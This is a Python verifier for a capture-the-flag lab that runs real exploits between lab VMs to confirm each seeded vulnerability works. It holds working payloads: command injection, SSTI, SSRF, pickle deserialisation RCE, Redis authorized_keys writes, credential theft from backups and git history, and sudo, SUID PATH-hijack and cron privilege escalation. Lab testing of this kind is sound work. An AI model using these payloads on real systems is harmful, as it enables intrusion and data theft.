#!/usr/bin/env python3
"""verify.py — live box-to-box exploit oracles for every seeded lane.

The R2 gid-flaw and R9 dead-lane bugs shipped because a lane LOOKED right but was
never fired end-to-end. This module fires each one: from a peer box (through the
Proxmox guest agent, the same out-of-band channel gate.py uses) it runs the REAL
exploit against a freshly-provisioned target and confirms it reaches the flag —
or, on a root-only board, that the foothold lands as operator and the paired
privesc lane escalates to root and reads the flag.

Every oracle proves the path or reports why it couldn't; none infers success from
configuration alone. Run right after provisioning, before the snapshot.

    PROXMOX_VE_API_TOKEN=... ./verify.py round.json   # exit 0 = every lane fired

Design notes:
  - Foothold RCE lanes (netdiag/ssti/ssrf/pickle) run an arbitrary command on the
    target as operator. On a group-readable board the command reads the flag; on a
    root-only board it proves operator identity (capture is the paired privesc).
  - Cred lanes (weakssh/disclosure/gitleak/redis) establish SSH-as-operator.
  - Privesc lanes (sudo/suid/rootcron) run ON the target as operator and escalate.
  - sshpass/redis-tools/git are provisioned into the recon toolkit for these.
"""
import base64
import os
import pickle
import secrets
import sys
import time
from urllib.parse import quote

import arena_config
import gate
import referee
import spec

VMID = referee.VMID                                   # {"ctf-1":201,...}
IP = {n: gate.CONTESTANTS[v] for n, v in VMID.items()}
WEAK_PW = arena_config.require("weak_pw")              # seeded playbook weak_password
SSHO = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
PRIVESC = spec.PRIVESC_LANES


# ── pickle payload builder (deserialised on the target → os.system) ──
class _Reduce:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def _pickle_b64(cmd):
    return base64.b64encode(pickle.dumps(_Reduce(cmd))).decode()


# ── foothold RCE exploiters: run `cmd` on the target, return combined output ──
def _rce_netdiag(att, ip, cmd):
    url = f"http://{ip}:8080/ping?host={quote(';' + cmd)}"
    return gate.guest_exec(att, ["curl", "-s", "--max-time", "20", url])[1] or ""


def _rce_ssti(att, ip, cmd):
    payload = "{{cycler.__init__.__globals__.os.popen(%r).read()}}" % cmd
    url = f"http://{ip}:8082/hello?name={quote(payload)}"
    return gate.guest_exec(att, ["curl", "-s", "--max-time", "20", url])[1] or ""


def _rce_ssrf(att, ip, cmd):
    inner = f"http://127.0.0.1:9000/run?cmd={quote(cmd)}"
    url = f"http://{ip}:8085/fetch?url={quote(inner)}"
    return gate.guest_exec(att, ["curl", "-s", "--max-time", "20", url])[1] or ""


RCE = {"netdiag": _rce_netdiag, "ssti": _rce_ssti, "ssrf": _rce_ssrf}


# ── per-lane oracles. Each returns (ok, detail). ──
def _foothold_rce(lane, att, tgt_vmid, ip, token, path, root_only):
    fn = RCE[lane]
    if root_only:
        out = fn(att, ip, "id -un")
        ok = "operator" in out
        return ok, (f"{lane}: RCE as operator OK (capture via paired privesc)" if ok
                    else f"{lane}: RCE did not land as operator (got {out[:80]!r})")
    out = fn(att, ip, f"cat {path}")
    ok = token in out
    return ok, (f"{lane}: captured the flag token" if ok
                else f"{lane}: exploit ran but no token (got {out[:80]!r})")


def _lfi(att, tgt_vmid, ip, token, path, root_only):
    url = f"http://{ip}:8081/?file={quote(path)}"
    out = gate.guest_exec(att, ["curl", "-s", "--max-time", "20", url])[1] or ""
    if token in out:
        return True, "lfi: read the flag file"
    if root_only:
        return False, "lfi: cannot capture a root-only flag (read-only lane, no escalation)"
    return False, f"lfi: did not return the token (got {out[:80]!r})"


def _pickle(att, tgt_vmid, ip, token, path, root_only):
    n = secrets.token_hex(4)
    proof = f"/tmp/pk_{n}"
    b64 = _pickle_b64(f"id -un > {proof}; cat {path} >> {proof} 2>/dev/null; chmod 644 {proof}")
    gate.guest_exec(att, ["bash", "-lc",
        f"printf %s '{b64}' | curl -s --max-time 20 --data-binary @- http://{ip}:8084/load"])
    out = gate.guest_exec(tgt_vmid, ["bash", "-lc", f"cat {proof} 2>/dev/null; rm -f {proof}"])[1] or ""
    if "operator" not in out:
        return False, f"pickle: RCE did not run as operator (got {out[:80]!r})"
    if not root_only and token in out:
        return True, "pickle: RCE as operator, captured the group-readable flag"
    return True, "pickle: RCE as operator OK (flag root-only → capture via paired privesc)"


def _ssh_pw(att, ip, pw, token, path):
    script = f"sshpass -p '{pw}' ssh {SSHO} operator@{ip} 'cat {path}' 2>&1"
    return gate.guest_exec(att, ["bash", "-lc", script])[1] or ""


def _weakssh(att, tgt_vmid, ip, token, path, root_only):
    out = _ssh_pw(att, ip, WEAK_PW, token, path)
    return (token in out), (f"weakssh: SSH as operator ({WEAK_PW}), read the flag"
                            if token in out else f"weakssh: login/read failed ({out[:80]!r})")


def _disclosure(att, tgt_vmid, ip, token, path, root_only):
    script = (
        f"pw=$(curl -s --max-time 20 http://{ip}:8083/app-backup.tar.gz "
        f"| tar xzO ./config/database.yml 2>/dev/null "
        f"| sed -n 's/.*password:[[:space:]]*\"\\?\\([^\"]*\\)\"\\?.*/\\1/p' | head -1); "
        f"test -n \"$pw\" && sshpass -p \"$pw\" ssh {SSHO} operator@{ip} 'cat {path}' 2>&1")
    out = gate.guest_exec(att, ["bash", "-lc", script])[1] or ""
    return (token in out), ("disclosure: found the backup password, SSH'd in, read the flag"
                            if token in out else f"disclosure: chain failed ({out[:80]!r})")


def _gitleak(att, tgt_vmid, ip, token, path, root_only):
    n = secrets.token_hex(3)
    script = (
        f"d=/tmp/gl_{n}; rm -rf $d; git clone -q http://{ip}:8086/.git $d 2>/dev/null; "
        f"pw=$(cd $d && git log -p --all 2>/dev/null "
        f"| sed -n 's/.*ssh_password:[[:space:]]*\"\\?\\([^\"]*\\)\"\\?.*/\\1/p' | head -1); "
        f"rm -rf $d; test -n \"$pw\" && sshpass -p \"$pw\" ssh {SSHO} operator@{ip} 'cat {path}' 2>&1")
    out = gate.guest_exec(att, ["bash", "-lc", script])[1] or ""
    return (token in out), ("gitleak: recovered the password from .git history, read the flag"
                            if token in out else f"gitleak: chain failed ({out[:80]!r})")


def _redis(att, tgt_vmid, ip, token, path, root_only):
    n = secrets.token_hex(3)
    key = f"/tmp/rk_{n}"
    script = (
        f"ssh-keygen -t ed25519 -f {key} -N '' -q; k=$(cat {key}.pub); "
        f"redis-cli -h {ip} flushall >/dev/null 2>&1; "
        f"redis-cli -h {ip} config set dir /home/operator/.ssh >/dev/null 2>&1; "
        f"redis-cli -h {ip} config set dbfilename authorized_keys >/dev/null 2>&1; "
        f"redis-cli -h {ip} set x $'\\n\\n'\"$k\"$'\\n\\n' >/dev/null 2>&1; "
        f"redis-cli -h {ip} save >/dev/null 2>&1; sleep 1; "
        f"ssh -i {key} {SSHO} -o BatchMode=yes operator@{ip} 'cat {path}' 2>&1; "
        f"rm -f {key} {key}.pub")
    out = gate.guest_exec(att, ["bash", "-lc", script])[1] or ""
    return (token in out), ("redis: wrote authorized_keys via no-auth Redis, SSH'd in, read the flag"
                            if token in out else f"redis: chain failed ({out[:80]!r})")


# ── privesc oracles: run on the target AS operator, escalate, read root-only flag ──
def _sudo(tgt_vmid, token, path):
    script = f"su - operator -c 'sudo -n find {path} -maxdepth 0 -exec cat {{}} \\;' 2>&1"
    out = gate.guest_exec(tgt_vmid, ["bash", "-lc", script])[1] or ""
    return (token in out), ("sudo: operator→root via NOPASSWD find, read the flag"
                            if token in out else f"sudo: privesc failed ({out[:100]!r})")


def _suid(tgt_vmid, token, path):
    n = secrets.token_hex(3)
    # base64 the fake `id` script so no quotes leak into the `su -c '...'` wrapper.
    fake = base64.b64encode(f"#!/bin/sh\ncat {path}\n".encode()).decode()
    inner = (f"d=/tmp/su_{n}; mkdir -p $d; echo {fake} | base64 -d > $d/id; "
             f"chmod +x $d/id; PATH=$d:$PATH /usr/local/bin/netcheck; rm -rf $d")
    out = gate.guest_exec(tgt_vmid, ["bash", "-lc", f"su - operator -c '{inner}' 2>&1"])[1] or ""
    return (token in out), ("suid: operator→root via netcheck PATH-hijack, read the flag"
                            if token in out else f"suid: privesc failed ({out[:100]!r})")


def _rootcron(tgt_vmid, token, path, wait=80):
    n = secrets.token_hex(3)
    proof = f"/tmp/rc_{n}"
    payload = f"#!/bin/bash\\ncat {path} > {proof} 2>/dev/null\\nchmod 644 {proof}\\n"
    gate.guest_exec(tgt_vmid, ["bash", "-lc",
        f"su - operator -c \"printf '{payload}' > /opt/maint/run.sh\""])
    deadline = time.time() + wait
    while time.time() < deadline:
        out = gate.guest_exec(tgt_vmid, ["bash", "-lc", f"cat {proof} 2>/dev/null"])[1] or ""
        if token in out:
            gate.guest_exec(tgt_vmid, ["bash", "-lc", f"rm -f {proof}"])
            return True, "rootcron: root timer ran the operator-planted payload, read the flag"
        time.sleep(10)
    return False, f"rootcron: no root execution within {wait}s"


CRED = {"weakssh": _weakssh, "disclosure": _disclosure, "gitleak": _gitleak, "redis": _redis}


def run_lane(lane, att, tgt_vmid, ip, token, path, root_only):
    if lane in RCE:
        return _foothold_rce(lane, att, tgt_vmid, ip, token, path, root_only)
    if lane == "lfi":
        return _lfi(att, tgt_vmid, ip, token, path, root_only)
    if lane == "pickle":
        return _pickle(att, tgt_vmid, ip, token, path, root_only)
    if lane in CRED:
        return CRED[lane](att, tgt_vmid, ip, token, path, root_only)
    if lane == "sudo":
        return _sudo(tgt_vmid, token, path)
    if lane == "suid":
        return _suid(tgt_vmid, token, path)
    if lane == "rootcron":
        return _rootcron(tgt_vmid, token, path)
    return False, f"{lane}: no verifier"


def verify_round(normalized):
    """Fire every seeded lane. Returns a list of {box,lane,ok,detail}."""
    flags = referee.load_flags()
    boxes = normalized["contestants"]
    names = [b["box"] for b in boxes]
    results = []
    for b in boxes:
        tgt = b["box"]
        tgt_vmid, ip = VMID[tgt], IP[tgt]
        token, path = flags[tgt]["token"], flags[tgt]["path"]
        root_only = normalized["flag_root_only"]
        att_name = next((o for o in names if o != tgt), None)
        att = VMID[att_name] if att_name else None
        for lane in b["lanes"]:
            if lane not in PRIVESC and att is None:
                results.append({"box": tgt, "lane": lane, "ok": False,
                                "detail": f"{lane}: no peer to attack from"})
                continue
            ok, detail = run_lane(lane, att, tgt_vmid, ip, token, path, root_only)
            results.append({"box": tgt, "lane": lane, "ok": ok, "detail": detail})
    return results


def main():
    if len(sys.argv) != 2:
        sys.exit("usage: verify.py <round.json>")
    if not gate.TOKEN:
        sys.exit("PROXMOX_VE_API_TOKEN not set")
    with open(sys.argv[1]) as fh:
        import json
        normalized, _ = spec.validate(json.load(fh))
    results = verify_round(normalized)
    bad = 0
    for r in results:
        mark = "PASS" if r["ok"] else "FAIL"
        if not r["ok"]:
            bad += 1
        print(f"  [{mark}] {r['box']}/{r['lane']}: {r['detail']}")
    print("=" * 60)
    if bad:
        print(f"VERIFY FAILED — {bad} lane(s) did not fire. Do NOT snapshot.")
        sys.exit(1)
    print(f"VERIFY PASSED — all {len(results)} seeded lanes fired end-to-end.")


if __name__ == "__main__":
    main()
